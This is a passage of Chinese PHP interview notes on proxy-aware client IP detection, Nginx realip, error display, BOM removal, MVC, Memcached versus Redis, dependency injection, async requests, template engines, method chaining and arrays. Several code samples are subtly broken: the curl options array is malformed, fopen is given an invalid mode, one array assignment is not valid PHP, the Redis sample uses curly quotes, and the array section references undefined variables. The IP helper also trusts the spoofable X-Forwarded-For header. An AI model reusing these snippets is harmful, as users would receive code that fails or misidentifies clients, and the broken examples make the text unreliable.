                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false){
                    return $ip;
                }
            }
        }
    }
}
```

您的代码似乎已经很完整了，我看不到其中的任何可能的错误（除了常见的IP警告），validate_ip()尽管如此，我还是将功能更改为依赖过滤器扩展：

```
public function validate_ip($ip)
{
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false)
    {
        return false;
    }

    self::$ip = sprintf('%u', ip2long($ip)); // you seem to want this

    return true;
}
```

此外，您的HTTP_X_FORWARDED_FOR代码段可以通过以下方式简化：

```
// check for IPs passing through proxies
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
    // check if multiple ips exist in var
    if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') !== false)
    {
        $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        
        foreach ($iplist as $ip)
        {
            if ($this->validate_ip($ip))
                return $ip;
        }
    }
    
    else
    {
        if ($this->validate_ip($_SERVER['HTTP_X_FORWARDED_FOR']))
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
}
```
对此：

```
// check for IPs passing through proxies
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
    $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        
    foreach ($iplist as $ip)
    {
        if ($this->validate_ip($ip))
            return $ip;
    }
}
```

您可能还需要验证IPv6地址。

服务端 IP

https://stackoverflow.com/questions/5800927/how-to-identify-server-ip-address-in-php
```
$_SERVER['SERVER_ADDR'];
$_SERVER['SERVER_PORT'];
```

如果您使用的是PHP 5.3或更高版本，则可以执行以下操作：
```
$host= gethostname();
$ip = gethostbyname($host);
```

了解代理透传 实际IP 的概念

1.基于代理(七层负载均衡)情况下 透传客户端的真实IP

环境:

10.0.0.5 proxy_node1 一级代理

10.0.0.6 proxy_node2 二级代理

10.0.0.7 proxy_node3 三级代理

10.0.0.8 webserver 真实节点

域名:ip.cheng.com 解析 --> 10.0.0.5

1.一级代理proxy_node1 Nginx配置如下:
```
[root@lb01 conf.d]# cat proxy_ip.cheng.com.conf 
server {
	listen 80;
	server_name ip.cheng.com;

	location / {
	proxy_pass http://10.0.0.6;
	proxy_http_version 1.1;
	proxy_set_header Host $http_host;
	proxy_set_header X-Real-IP $remote_addr;
	proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;	
	}
}

```
2.二级代理proxy_node2 Nginx配置如下:

```
[root@lb02 conf.d]# cat proxy_ip.cheng.com.conf 
server {
	listen 80;
	server_name ip.cheng.com;

	location / {
	proxy_pass http://10.0.0.7;
	proxy_http_version 1.1;
	proxy_set_header Host $http_host;
	proxy_set_header X-Real-IP $remote_addr;
	proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;	
	}
}
```

3.三级代理proxy_node3 Nginx配置如下:

```
[root@web01 conf.d]# cat proxy_ip.cheng.com.conf 
server {
	listen 80;
	server_name ip.cheng.com;

	location / {
	proxy_pass http://10.0.0.8;
	proxy_http_version 1.1;
	proxy_set_header Host $http_host;
	proxy_set_header X-Real-IP $remote_addr;
	proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;	
	}
}
```

4.WebServer Nginx配置如下:

```
[root@web02 conf.d]# cat proxy_ip.cheng.com.conf 
server {
	listen 80;
	server_name ip.cheng.com;
	root /code;

	location / {
	index index.php index.html;
	}

	location ~ \.php$ {
	fastcgi_pass 127.0.0.1:9000;
	fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
	include fastcgi_params;
	}
}
```

5.测试方式一，通过如下页面获取真实IP，或查看 phpinfo() 函数中的 HTTP_X_FORWARDED_FOR

```
[root@web02 code]# cat index.php 
<?php
	$ip = getenv("HTTP_X_FORWARDED_FOR");
	echo "X_FORWARDED_FOR: $ip";
?>
```

6.测试方式二，通过查看日志测试

2.Nginx RealIP获取真实IP
使用nginx Realip_module获取多级代理下的客户端真实IP地址,在真实Web节点上配置，配置信息如下：

```
[root@web02 conf.d]# cat proxy_ip.cheng.com.conf 
server {
	listen 80;
	server_name ip.cheng.com;
	root /code;
	set_real_ip_from 10.0.0.5;
	set_real_ip_from 10.0.0.6;
	set_real_ip_from 10.0.0.7;
	real_ip_header   X-Forwarded-For;
	real_ip_recursive on;

	location / {
	index index.php index.html;
	}

	location ~ \.php$ {
	fastcgi_pass 127.0.0.1:9000;
	fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
	include fastcgi_params;
	}
}
```

最终结果是"10.0.0.1 - - "GET /index.php HTTP/1.1" 200 "10.0.0.5, 10.0.0.6" 10.0.0.5，10.0.0.6都出现在set_real_ip_from中，仅仅10.0.0.1没出现，那么他就被认为是用户的ip地址，同时会被赋值到 $remote_addr变量中。

获取真实IP总结：

forwarded-for：可以获取到用户的真实IP地址。

nginx realip：程序无需改动，直接使用remote_addr变量即可获取真实IP地址，但需要知道所有沿途经过的IP地址或IP段

### 如何开启 PHP 异常提示

php.ini 开启 `display_errors` 设置 `error_reporting` 等级

运行时，使用 `ini_set(k, v);` 动态设置

PHP打开错误提示和关闭错误提示的方法
找到php的配置文件，也就是php.ini

在文件中查找 `display_errors`   查找到 `display_errors = Off` 或者 `display_errors = On`
Off为关闭错误提示，On为打开错误提示，根据需求修改即可。

也可在php文件中加入以下代码

```
//禁用错误报告
error_reporting(0);
//报告运行时错误
error_reporting(E_ERROR | E_WARNING | E_PARSE);
//报告所有错误
error_reporting(E_ALL);
```

### 如何获取扩展安装路径
`phpinfo();` 页面查找 `extension_dir`

命令行 `php -i |grep extension_dir`

运行时 `echo ini_get('extension_dir');`

### 字符串、数字比较大小的原理，注意 0 开头的8进制、0x 开头16进制
字符串比较大小，从左(高位)至右，逐个字符 ASCII 比较

### BOM 头是什么，怎么除去
`0xEF`,`0xBB`,`0xBF`
WINDOWS自带的记事本，在保存一个以 UTF-8 编码的文件时，会在文件开始的地方插入三个不可见的字符（`0xEF 0xBB 0xBF，即BOM`）。

它是一串隐藏的字符，用于让记事本等编辑器识别这个文件是否以UTF-8编码。对于一般的文本文件， 这样并不会产生什么麻烦。但对于 PHP来说，BOM是个大麻烦。

PHP并不会忽略BOM，所以在读取、包含或者引用这些文件时，会把 BOM 作为该文件开头正文的一部分。

根据嵌入式语言的特点，这串字符将被直接执行（显示）出来。由此造成即使页面的 top padding 设置为0， 也无法让整个网页紧贴浏览器顶部，因为在html一开头有这3个字符呢！

而且 BOM 是内容输入，如果没有开启缓冲区输出的时候，BOM 会影响 header 函数的使用， 因为在header之前不能有任何有效的内容输出，BOM也算是有效内容输出。

去掉BOM的方法，建议使用专业的代码编辑器工具来处理 例如 Notepad++ 或者 EditPlus 在新建和保存以及转换编码的功能内都会有无 BOM的格式选择。

检测、去除

https://stackoverflow.com/questions/10290849/how-to-remove-multiple-utf-8-bom-sequences-before-doctype

you would use the following code to remove utf8 bom

```
//Remove UTF8 Bom

function remove_utf8_bom($text)
{
    $bom = pack('H*','EFBBBF');
    $text = preg_replace("/^$bom/", '', $text);
    return $text;
}
```

### 什么是 MVC 
MVC 即 Model、View、Controller 即模型、视图、控制器。

在 web 项目中 View 层是界面，Controller 层是业务逻辑，Model 层是数据库访问。

MVC 要实现的目标是将软件用户界面和业务逻辑分离以使代码可扩展性、可复用性、可维护性、灵活性加强。

控制器的作用就是这么简单， 用来将不同的View和不同的Model组织在一起，顺便替双方传递消息，仅此而已。

组成MVC的三个模式分别是组合模式、策咯模式、观察者模式，MVC在软件开发中发挥的威力，最终离不开这三个模式的默契配合。

### Memcached 与 Redis 区别
Redis和Memcache 都是基于内存的数据存储系统。Memcached是高性能分布式内存缓存服务， 其本质上就是一个内存key-value数据库。Redis是一个开源的key-value存储系统。与Memcached类似， Redis将大部分数据存储在内存中，支持的数据类型包括：字符串、哈希表、链表、集合、有序集合以及基于这些数据类型的相关操作。

那么，Memcache与Redis有什么区别呢？

1、数据操作不同

与Memcached仅支持简单的key-value结构的数据记录不同，Redis支持的数据类型要丰富得多。

Memcached基本只支持简单的key-value存储，不支持枚举，不支持持久化和复制等功能。

Redis支持服务器端的数据操作相比Memcached来说，拥有更多的数据结构和并支持更丰富的数据操作， 支持list、set、sorted set、hash等众多数据结构，还同时提供了持久化和复制等功能。

而通常在Memcached里，使用者需要将数据拿到客户端来进行类似的修改再set回去， 这大大增加了网络IO的次数和数据体积。在Redis中，这些复杂的操作通常和一般的GET/SET一样高效。

所以，如果需要缓存能够支持更复杂的结构和操作， Redis会是更好的选择。

2、内存管理机制不同

在Redis中，并不是所有的数据都一直存储在内存中的。这是和Memcached相比一个最大的区别。

当物理内存用完时，Redis可以将一些很久没用到的value交换到磁盘。Redis只会缓存所有的key的信息， 如果Redis发现内存的使用量超过了某一个阀值，将触发swap的操作，Redis根据“swappability = age*log(size_in_memory)”

计算出哪些key对应的value需要swap到磁盘。然后再将这些key对应的value持久化到磁盘中，同时在内存中清除。

这种特性使得Redis可以保持超过其机器本身内存大小的数据。

而Memcached默认使用Slab Allocation机制管理内存，其主要思想是按照预先规定的大小， 将分配的内存分割成特定长度的块以存储相应长度的key-value数据记录，以完全解决内存碎片问题。

从内存利用率来讲，使用简单的key-value存储的话，Memcached的内存利用率更高。

而如果Redis采用hash结构来做key-value存储，由于其组合式的压缩，其内存利用率会高于Memcached。

3、性能不同

由于Redis只使用单核，而Memcached可以使用多核，所以平均每一个核上Redis在存储小数据时比Memcached性能更高。

而在100k以上的数据中，Memcached性能要高于Redis，虽然Redis也在存储大数据的性能上进行了优化，但是比起Memcached，还是稍有逊色。

4、集群管理不同

Memcached是全内存的数据缓冲系统，Redis虽然支持数据的持久化，但是全内存毕竟才是其高性能的本质。

作为基于内存的存储系统来说，机器物理内存的大小就是系统能够容纳的最大数据量。

如果需要处理的数据量超过了单台机器的物理内存大小，就需要构建分布式集群来扩展存储能力。

Memcached本身并不支持分布式，因此只能在客户端通过像一致性哈希这样的分布式算法来实现Memcached的分布式存储。

相较于Memcached只能采用客户端实现分布式存储，Redis更偏向于在服务器端构建分布式存储。

### redis
Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。

redis包括string(字符串)、list(链表)、set(集合)、zset(sorted set --有序集合)和hashs（哈希类型）。

这些数据类型都 支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。

php中reids的操作
```
// from 菜鸟runoob
// 从代码中以点带面，在什么样的场景中会运用到

// 配置连接的IP、端口、以及相应的数据库
$server = array(
‘host’     => ’127.0.0.1′,
‘port’     => 6379,
‘database’ => 15
);
$redis = new Client($server);

// 普通set/get操作
$redis->set(‘library’, ‘predis’);
$retval = $redis->get(‘library’);
echo $retval; //显示 ‘predis’

$redis->exists(‘foo’);//true

// del 删除
$redis->del(‘foo’);//true

// hset/hget 存取hash表的数据
$redis->hset(‘hash1′,’key1′,’v1′); //将key为’key1′ value为’v1′的元素存入hash1表
$redis->hset(‘hash1′,’key2′,’v2′);
$redis->hget(‘hash1′,’key1′);  //取出表’hash1′中的key ‘key1′的值,返回’v1′

// 同步保存服务器数据到磁盘
$redis->save();
```

### Yii2中的依赖注入
基本概念

1.依赖倒置（反转）原则（DIP）：一种软件架构设计的原则（抽象概念，是一种思想） 在面向对象编程领域中，依赖反转原则（Dependency inversion principle，DIP）是指一种特定的解耦 （传统的依赖关系创建在高层次上，而具体的策略设置则应用在低层次的模块上）形式， 使得高层次的模块不依赖于低层次的模块的实现细节，依赖关系被颠倒（反转），从而使得低层次模块依赖于高层次模块的需求抽象。

该原则规定：

1.高层次的模块不应该依赖于低层次的模块，两者都应该依赖于抽象接口。

2.抽象接口不应该依赖于具体实现。而具体实现则应该依赖于抽象接口。

在上图中，高层对象A依赖于底层对象B的实现；图2中，把高层对象A对底层对象的需求抽象为一个接口A， 底层对象B实现了接口A，这就是依赖反转。

该原则颠倒了一部分人对于面向对象设计的认识方式。如高层次和低层次对象都应该依赖于相同的抽象接口。

它转换了依赖，高层模块不依赖于低层模块的实现，而低层模块依赖于高层模块定义的接口。通俗的讲，就是高层模块定义接口，低层模块负责实现。

2.控制反转（IoC）：一种反转流、依赖和接口的方式（DIP的具体实现方式，一种设计原则）

控制反转（Inversion of Control，缩写为IoC），是面向对象编程中的一种设计原则，可以用来减低计算机代码之间的耦合度。

其中最常见的方式叫做依赖注入（Dependency Injection，简称DI），还有一种方式叫“依赖查找”（Dependency Lookup）。

通过控制反转，对象在被创建的时候，由一个调控系统内所有对象的外界实体，将其所依赖的对象的引用传递给它。也可以说，依赖被注入到对象中。

参考：https://segmentfault.com/a/1190000010788354

入口文件
```
> 文件位置：web\index.php

//定义全局变量
defined('YII_DEBUG') or define('YII_DEBUG', true);
defined('YII_ENV') or define('YII_ENV', 'dev');

//composer自动加载代码机制，可参考 https://segmentfault.com/a/1190000010788354
require(__DIR__ . '/../vendor/autoload.php');

//1.引入工具类Yii
//2.注册自动加载函数
//3.生成依赖注入中使用到的容器
require(__DIR__ . '/../vendor/yiisoft/yii2/Yii.php');

//加载应用配置
$config = require(__DIR__ . '/../config/web.php');

//生成应用并运行
(new yii\web\Application($config))->run();

参考：https://segmentfault.com/a/1190000011823699
```

### 依赖注入实现原理
依然是来自到喜啦的一道面试题，你知道什么是依赖注入吗？

依赖注入（DI）的概念虽然听起来很深奥，但是如果你用过一些新兴的php框架的话， 对于DI一定不陌生，因为它们多多少少都用到了依赖注入来处理类与类之间的依赖关系。

php中传递依赖关系的三种方案

其实要理解DI，首先要明白在php中如何传递依赖关系。

第一种方案，也是最不可取的方案，就是在A类中直接用new关键词来创建一个B类，如下代码所示：
```
<?php
class A
{
  public function __construct()
  {
    $b = new B();
  }
}
```
为什么这种方案不可取呢？因为这样的话，A与B就耦合在了一起，也就是说A类无法脱离B类工作。

第二种方案就是在A类的方法中传入需要的B类，如下代码所示：
```
<?php
class A
{
  public function __construct(B $b)
  {
  }
}
```
这种方法比第一种方案有了改进，A类不必与B类捆绑在一起，只要传入的类满足A类的需求，也可以是C类，也可以是D类等等。

但是这种方案的弊端在于如果A类依赖的类较多，参数列表会很长，容易发生混乱。

第三种方案是使用set方法传入，如下代码所示：
```
<?php
class A
{
  public function setB(B $b)
  {
    $this->b = $b;
  }
}
```
这种方案同样存在和第二种方案一样的弊端，当依赖的类增多时，我们需要些很多很多的set方法。

这时我们在想如果有一个专门的类（或者说一个容器）可以帮我们管理这些依赖关系就好了。

一个简单的依赖注入的例子
如下代码来自twittee：
```
<?php
class Container {
 private $s=array();
 function __set($k, $c) { $this->s[$k]=$c; }
 function __get($k) { return $this->s[$k]($this); }
}
```
有了container类之后我们可以怎样管理A与B之间的依赖关系呢，用代码说话吧：
```
<?php
class A
{
  private $container;
  public function __construct(Container $container)
  {
    $this->container = $container;
  }
  public function doSomeThing()
  {
    //do something which needs class B
    $b = $this->container->getB();
    //to do
  }
}
```
再将B类注入到容器类中：
```
$c = new Container();
$c->setB(new B());
```
还可以传入一个匿名函数，这样B类就不会在传入时就立即实例化，而是在真正调用时才完成实例化的工作：
```
$c = new Container();
$c->setB(function (){
  return new B();
});
```
这里举的只是一个很简单的例子，在实际中，容器类要考虑的有很多，比如延迟加载等等。

### 如何异步执行命令
客户端与服务器端是通过HTTP协议进行连接通讯，客户端发起请求，服务器端接收到请求后执行处理，并返回处理结果。

有时服务器需要执行很耗时的操作，这个操作的结果并不需要返回给客户端。

但因为php是同步执行的，所以客户端需要等待服务处理完才可以进行下一步。

因此对于耗时的操作适合异步执行，服务器接收到请求后，处理完客户端需要的数据就返回，再异步在服务器执行耗时的操作。

1.使用Ajax 与 img 标记

原理，服务器返回的html中插入Ajax 代码或 img 标记，img的src为需要执行的程序。

优点：实现简单，服务端无需执行任何调用

缺点：在执行期间，浏览器会一直处于loading状态，因此这种方法并不算真正的异步调用。
```
$.get("doRequest.php", { name: "fdipzone"} );
<img src="doRequest.php?name=fdipzone">
```

2.使用popen

使用popen执行命令，语法：
```
// popen — 打开进程文件指针  
resource popen ( string $command , string $mode )
pclose(popen('php /home/fdipzone/doRequest.php &', 'r'));
```
优点：执行速度快

缺点：

1）.只能在本机执行

2）.不能传递大量参数

3）.访问量高时会创建很多进程

3.使用curl

设置curl的超时时间 CURLOPT_TIMEOUT 为1 （最小为1），因此客户端需要等待1秒
```
<?php 
$ch = curl_init(); 
$curl_opt = array( 
  CURLOPT_URL, 'http://www.example.com/doRequest.php'
  CURLOPT_RETURNTRANSFER,1, 
  CURLOPT_TIMEOUT,1 
); 
curl_setopt_array($ch, $curl_opt); 
curl_exec($ch); 
curl_close($ch); 
?>

```
4.使用fsockopen

fsockopen是最好的，缺点是需要自己拼接header部分。
```
<?php 
$url = 'http://www.example.com/doRequest.php'; 
$param = array( 
  'name'=>'fdipzone', 
  'gender'=>'male', 
  'age'=>30 
); 
doRequest($url, $param); 
function doRequest($url, $param=array()){ 
  $urlinfo = parse_url($url); 
  $host = $urlinfo['host']; 
  $path = $urlinfo['path']; 
  $query = isset($param)? http_build_query($param) : ''; 
  $port = 80; 
  $errno = 0; 
  $errstr = ''; 
  $timeout = 10; 
  $fp = fsockopen($host, $port, $errno, $errstr, $timeout); 
  $out = "POST ".$path." HTTP/1.1\r\n"; 
  $out .= "host:".$host."\r\n"; 
  $out .= "content-length:".strlen($query)."\r\n"; 
  $out .= "content-type:application/x-www-form-urlencoded\r\n"; 
  $out .= "connection:close\r\n\r\n"; 
  $out .= $query; 
  fputs($fp, $out); 
  fclose($fp); 
} 
?>
```
注意：当执行过程中，客户端连接断开或连接超时，都会有可能造成执行不完整，因此需要加上
```
ignore_user_abort(true); // 忽略客户端断开 
set_time_limit(0);    // 设置执行不超时
```

### 模板引擎是什么，解决什么问题、实现原理（Smarty、Twig、Blade）
PHP的模板引擎smarty原理是什么（整理）

一、总结
一句话总结：其实所有的模板引擎的工作原理是差不多的，无非就是在php程序里面用正则匹配将模板里面的标签替换为php代码从而将两者混合为一个php的混编文件，然后执行这个混编文件。

1、smarty模板引擎的主要作用是什么？

smarty模板技术，可以让数据和视图进行分离，让视图中不能直接出现php代码。

这样的话，让前段页面的开发和后台数据的开发，可以双管齐下，同时进行了。

2、smarty的两个函数的主要作用是什么？

smarty模板的使用比较简单，主要有两个非常核心的函数。一个是assign()， 把模板中要使用的数据进行预赋值，一个是display()，用来解析和展示最后的视图模板。

使用的简单代码如下：
```
include_once "Smarty.class.php";//引入smarty类
$smarty = new Smarty;//创建smarty对象
$smarty->assign("name","zhangmiao");//赋值，以备模板中使用
$smarty->assign("age","18");
$smarty->display('index.tpl');//引入模板，展示视图页面
```
3、我们模板中没有php代码，我们只用了{$name}和{$age}就能把对应的变量给展示了出来，是为什么呢？

然后，我们一看smarty编译后的文件是这样的：
```
<h1>测试模板1</h1>
我的名字是：<?php echo $this->var["name"]; ?><br/>
我的年纪是：<?php echo $this->var["age"]; ?><br/>
```
原来如此，最终还是变成了含有php代码的模板，但是这个模板中把标签转成php代码的工作，我们交给了smarty模板引擎来完成的。

那到底smarty模板引擎是怎么把模板里面的非php代码的标签，转变成被最终可以解析执行的php代码的呢？

主要思路是：替换。

分成了两步：

1、用过assign函数把要解析的标签变量赋值

2、通过display函数把标签替换成对象的php变量

我们根据这个思路，自己也写了个简易版的smarty模板引擎，算是多smarty模板引擎设计原理的一种理解。

但是只能解析单个变量的标签，其他标签均没有处理。核心代码如下：
```
//获取模板源文件，用来替换
$template_content = file_get_contents($template_path);

$pattern = array(
    '/\{\s*\$([a-zA-Z][a-zA-Z0-9_]*)\s*\}/i'
);
$replace = array(
    '<?php echo $this->var["${1}"]; ?>'
);
//用正则去替换模板源文件中的变量符号{$varname}
$res = preg_replace($pattern,$replace,$template_content);
//编译后文件写入某个目录
file_put_contents($template_c_path,$res);
```

4、smarty模板引擎里面的display函数的最核心的操作是什么？
替换

```
把标签的内容替换成php的内容
例如把
<h1>测试模板1</h1>
我的名字是：{$name}<br/>
我的年纪是：{$age}<br/>
替换为：

<h1>测试模板1</h1>
我的名字是：<?php echo $this->var["name"]; ?><br/>
我的年纪是：<?php echo $this->var["age"]; ?><br/>
```

二、PHP的模板引擎smarty原理浅谈

　　mvc是开发中的一个伟大的思想，使得开发代码有了更加清晰的层次，让代码分为了三层各施其职、
无论是对代码的编写以及后期的阅读和维护，都提供了很大的便利。

　　我们在php开发中，视图层view是不允许有php代码来操作数据库之类的来获取数据的，
我们一般都会在控制器层controller，就已经把视图层要展示的数据准备好，方便视图层直接用来展示。

　　smarty模板技术，可以让数据和视图进行分离，让视图中不能直接出现php代码。
这样的话，让前段页面的开发和后台数据的开发，可以双管齐下，同时进行了。

　　

　　smarty模板的使用比较简单，主要有两个非常核心的函数。一个是assign()，
把模板中要使用的数据进行预赋值，一个是display()，用来解析和展示最后的视图模板。

　　使用的简单代码如下：
```
include_once "Smarty.class.php";//引入smarty类
$smarty = new Smarty;//创建smarty对象
$smarty->assign("name","zhangmiao");//赋值，以备模板中使用
$smarty->assign("age","18");
$smarty->display('index.tpl');//引入模板，展示视图页面

我们看下模板源代码是这样的：
<h1>测试模板1</h1>
我的名字是：{$name}<br/>
我的年纪是：{$age}<br/>
浏览器页面是这样的：
疑问：我们模板中没有php代码，我们只用了{$name}和{$age}就能把对应的变量给展示了出来，是什么鬼呢？
```

然后，我们一看smarty编译后的文件是这样的：

```
<h1>测试模板1</h1>
我的名字是：<?php echo $this->var["name"]; ?><br/>
我的年纪是：<?php echo $this->var["age"]; ?><br/>
```
原来如此，最终还是变成了含有php代码的模板，但是这个模板中把标签转成php代码的工作，我们交给了smarty模板引擎来完成的。

那到底smarty模板引擎是怎么把模板里面的非php代码的标签，转变成被最终可以解析执行的php代码的呢？

主要思路是：替换。

分成了两步：

1、用过assign函数把要解析的标签变量赋值

2、通过display函数把标签替换成对象的php变量

我们根据这个思路，自己也写了个简易版的smarty模板引擎，算是多smarty模板引擎设计原理的一种理解。

但是只能解析单个变量的标签，其他标签均没有处理。代码如下：
```
class MySmarty{

    //模板存放路径
    public $template = './template/';
    //编译后模板路径
    public $template_c = './template_c/';

    //存放变量的数组,通过assign函数赋值
    public $var = array();


    //变量赋值
    public function assign($vkey,$value){
        if($vkey != ""){
            $this->var[$vkey] = $value;//把要模板中解析的数据压入数组
        }
    }

    //模板中变量替换
    public function display($path){
        $template_path = $this->template.$path;
        $template_c_path = $this->template_c.$path.".php";
        if(!file_exists($template_path)){
            return false;
        }

        //只有解析后的模板文件不存在或者模板源文件有新的改动的情况下 重新解析模板       
        if(!file_exists($template_c_path) || filemtime($template_path)>filemtime($template_c_path)){
            //获取模板源文件，用来替换
            $template_content = file_get_contents($template_path);

            $pattern = array(
                '/\{\s*\$([a-zA-Z][a-zA-Z0-9_]*)\s*\}/i'
            );
            $replace = array(
                '<?php echo $this->var["${1}"]; ?>'
            );
            //用正则去替换模板源文件中的变量符号{$varname}
            $res = preg_replace($pattern,$replace,$template_content);
            //编译后文件写入某个目录
            file_put_contents($template_c_path,$res);
        }
        //引入编译后文件，其实就是执行了那个php文件的代码
        include_once $template_c_path;

    }
}
```
 
我们调用自己的assign和display放入引入，也能正常解析使用啦

三、Smarty模板执行原理

为了实现程序的业务逻辑和内容表现页面的分离从而提高开发速度，php 引入了模板引擎的概念， php 模板引擎里面最流行的可以说是smarty了，smarty因其功能强大而且速度快而被广大php web开发者所认可。

本文将记录一下smarty模板引擎的工作执行原理，算是加深一下理解。

其实所有的模板引擎的工作原理是差不多的，无非就是在php程序里面 用正则匹配将模板里面的标签替换为php代码从而将两者混合为一个php的混编文件， 然后执行这个混编文件。基本上就是这么回事儿了。下面以smarty为例说下这个过程。

例如文章页面：http://www.phpernote.com/article.php?id=795

一般处理过程是这样的：
```
html模板页面部分代码（article.html）：

<body>
<div>{subject}</div>
<div>{content}</div>
</body>
```
php页面逻辑部分代码：

```
$subject='smarty视频教程分享';
$content='smarty视频教程分享，下面是具体的下载地址，有需要的朋友可以看看，对smarty模板讲解的非常详细，作者粗略看了一下目录，真是详细到细枝末节该......';
$str=file_get_contents('article.html');
$str=str_replace('{subject}',$subject,$str);
$str=str_replace('{content}',$content,$str);
echo $str;
```
使用面向对象技术实现模板功能的封装代码如下：

```
<?php
class Template{
    //属性
    public $vars;                        //保存要替换的标记和数据的内容
    public $left_delimiter='{*';        //左分隔符
    public $right_delimiter='*}';        //右分隔符
    //方法
    public function assign($key,$value){
        $this->vars[$key]=$value;
    }
    public function display($file){//file表示模板名
        $str=file_get_contents($file);//从模板中读取多有内容，并将内容放入$str中
        foreach ($this->vars as $key => $value){ //$key 键名（模板标记） $value 值
            $str=str_replace($this->left_delimiter.$key.$this->right_delimiter, $value, $str);
        }
        echo $str;
        //file_put_contents('bak.html', $str);
    }
}
注意：assign(‘name’,’zhangsan’)；这句的时候其实还没有进行数据替换，而是把传入的数据保存在vars[]中，当display的时候才进行数据替换。
```

smarty的处理过程：

1、 smarty将php源文件，首先编译成中间文件

2、 如果启用缓存，再根据编译文件生成缓存文件

3、 之后每次访问都会访问编译文件

如果启用缓存文件而且有缓存文件并且缓存文件没有过期，则直接访问缓存文件（先不考虑缓存的时候的流程） 编译文件里时间戳记录模板文件修改时间，如果模板被修改过就可以检测到，然后重新编译。

（编译是把静态内容保存起来，动态内容根据传入的参数不同而不同）

读取编译文件省去了读取模板文件，和字符串替换的时间，所以可以更快。

第一次请求article.php时候编译，产生编译文件，在编译文件里。

第二次请求article.php的时候，判断模板文件是否改变，如果模板文件已改变， 那么去读取模板文件，然后再编译，如果没有改变，则去读取编译文件，编译文件最终输出；

缓存默认是关闭的；缓存是把数据彻底的存在缓存文件里，直到缓存文件过期才会重新来缓存； 所以说smarty在一些实时性特别强的网站里不是特别合适；

考虑缓存： 在smarty程序里，判断是否开启了缓存文件，并且缓存文件没有过期，，就去找缓存文件， 如果没有开启缓存文件，就去判断模板文件，如果缓存文件已过期，也是去判断模板文件。

### 如何实现链式操作 `$obj->w()->m()->d();`
在php中有很多字符串函数，例如要先过滤字符串收尾的空格，再求出其长度，一般的写法是：
```
strlen(trim($str))
```
如果要实现类似js中的链式操作，比如像下面这样应该怎么写？
```
$str->trim()->strlen()
```
下面分别用三种方式来实现：

方法一、使用魔法函数__call结合call_user_func来实现

思想：首先定义一个字符串类StringHelper，构造函数直接赋值value，然后链式调用trim()和strlen()函数，通过在调用的魔法函数__call()中使用call_user_func来处理调用关系，实现如下：
```
class StringHelper
{
  private $value;
  function __construct($value)
  {
    $this->value = $value;
  }
  function __call($function, $args){
    $this->value = call_user_func($function, $this->value, $args[0]);
    return $this;
  }
  function strlen() {
    return strlen($this->value);
  }
}
$str = new StringHelper(" sd f 0");
echo $str->trim('0')->strlen();

```
终端执行脚本：
```
php test.php
```

方法二、使用魔法函数__call结合call_user_func_array来实现

```
class StringHelper
{
  private $value;
  function __construct($value)
  {
    $this->value = $value;
  }
  function __call($function, $args){
    array_unshift($args, $this->value);
    $this->value = call_user_func_array($function, $args);
    return $this;
  }
  function strlen() {
    return strlen($this->value);
  }
}
$str = new StringHelper(" sd f 0");
echo $str->trim('0')->strlen();
```

说明：
array_unshift(array,value1,value2,value3...)
array_unshift() 函数用于向数组插入新元素。新数组的值将被插入到数组的开头。
call_user_func()和call_user_func_array都是动态调用函数的方法，区别在于参数的传递方式不同。

方法三、不使用魔法函数__call来实现
只需要修改_call()为trim()函数即可：
```
public function trim($t)
{
  $this->value = trim($this->value, $t);
  return $this;
}
```

重点在于，返回$this指针，方便调用后者函数。

### Xhprof 、Xdebug 性能调试工具使用
php调试方式： https://blog.csdn.net/kikajack/article/details/81014804

PHP 后端开发之调试方法： https://blog.csdn.net/f786587718/article/details/90603514
```
//输出日志内容到文件
$fp = fopen('./php.log', '测试');
fwrite($fp, print_r($content, true));
fclose($fp);
 
//输出对象到文件，追加方式写入
file_put_contents("/php.log", var_export($objects,true), FILE_APPEND);
```

### 索引数组 `[1, 2]` 与关联数组 `['k1'=>1, 'k2'=>2]` 有什么区别
```
    /*
	 *关联数组与索引数组的区别
	 */
 
	/*
	 *创建一个索引数组，索引数组的键是“0”，值是“苹果”
    *带有数字索引的数组。 
    */ 
	$fruit=array("苹果","香蕉");  
	// print_r($fruit); 
 
	//索引数组有三种赋值方式
	$arr = array[0]='苹果';
	$arr = array('0' => '苹果', '1' => '香蕉' );
	$arr = array('苹果');
 
	//请创建一个数组变量arr,并尝试创建一个索引数组，键是0，值是苹果  
	$arr1=array(0=>'a');
	// unset ($arr1); //销毁变量 
	if(isset($arr1)){ //isset — 检测变量是否已设置并且非 NULL $arr1 = NULL;
		//var_dump($arr1);
	}else{
		echo '未设置';
	}  
 
	//用for与foreach可以访问到数组里面的元素，因for比较容易下面只举使用foreach的例子，
	$fruit=array('苹果','香蕉','菠萝');
	//for和foreach的遍历
	for($i=0; $i < count($fruit) ; $i++){ 
	  	echo "数字是：$i"."的值是:".$fruit[$i]." <br>";
	}  
	foreach($fruit as $key=>$value){  
	    echo '<br>第'.$key.'值是：'.$value;  
	} 
        for($x=0;$x<count($arrlength);$x++) {}
 
 
 
 
	/*
	 *创建一个关联数组，关联数组的键“orange”，值是“橘子”
         *带有指定键的数组
        */  
	$fruit=array('orange'=>'橘子');  
	echo $fruit['orange'];
        foreach($age as $x=>$v) {
        $arr[$k]['name'] = $v['name'];
    }
```

### 缓存的使用方式、场景
https://zhuanlan.zhihu.com/p/40091810

为什么使用缓存

提升性能：使用缓存可以跳过数据库查询，分布式系统中可以跳过多次网络开销。在读多写少的场景下，可以有效的提高性能，降低数据库等系统的压力。

缓存的适用场景

1.数据不需要强一致性

2.读多写少，并且读取得数据重复性较高

